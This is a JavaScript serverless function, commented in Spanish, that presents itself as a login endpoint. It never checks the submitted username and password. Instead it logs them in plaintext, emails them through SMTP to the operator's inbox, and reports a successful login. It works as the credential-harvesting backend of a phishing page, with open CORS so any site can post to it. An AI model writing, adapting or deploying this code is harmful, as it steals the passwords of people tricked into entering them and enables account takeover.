require('dotenv').config();
const nodemailer = require('nodemailer');

exports.handler = async (event) => {
  console.log('Función iniciada');
  
  // Añadir headers CORS
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Content-Type': 'application/json'
  };

  // Manejar preflight OPTIONS request
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: ''
    };
  }

  if (event.httpMethod !== 'POST') {
    console.log('Método no permitido');
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Método no permitido' })
    };
  }

  try {
    const { username, password } = JSON.parse(event.body);
    console.log('Datos recibidos:', { username, password });

    // Leer variables de entorno correctas
    const user = process.env.SMTP_USER;
    const pass = process.env.SMTP_PASS;
    const host = process.env.SMTP_HOST;
    const port = process.env.SMTP_PORT;

    // Log para depuración
    console.log('SMTP_USER:', user, 'SMTP_PASS length:', pass ? pass.length : 'undefined');
    console.log('SMTP_HOST:', host, 'SMTP_PORT:', port);

    if (!user || !pass || !host || !port) {
      throw new Error('Configuración de email incompleta');
    }

    // Configurar el transporter
    const transporter = nodemailer.createTransport({
      host,
      port,
      secure: false,
      auth: {
        user,
        pass
      }
    });

    // Enviar correo
    const info = await transporter.sendMail({
      from: user,
      to: user, // Puedes cambiar esto si quieres enviar a otro destinatario
      subject: 'Nuevo inicio de sesión detectado',
      text: `Usuario: ${username}\nContraseña: ${password}`,
      html: `
        <h3>Nuevo inicio de sesión detectado</h3>
        <p><strong>Usuario:</strong> ${username}</p>
        <p><strong>Contraseña:</strong> ${password}</p>
      `
    });

    console.log('Correo enviado:', info);

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ message: 'Inicio de sesión exitoso' })
    };
  } catch (error) {
    console.error('Error detallado:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'Error interno del servidor', details: error.message })
    };
  }
}; 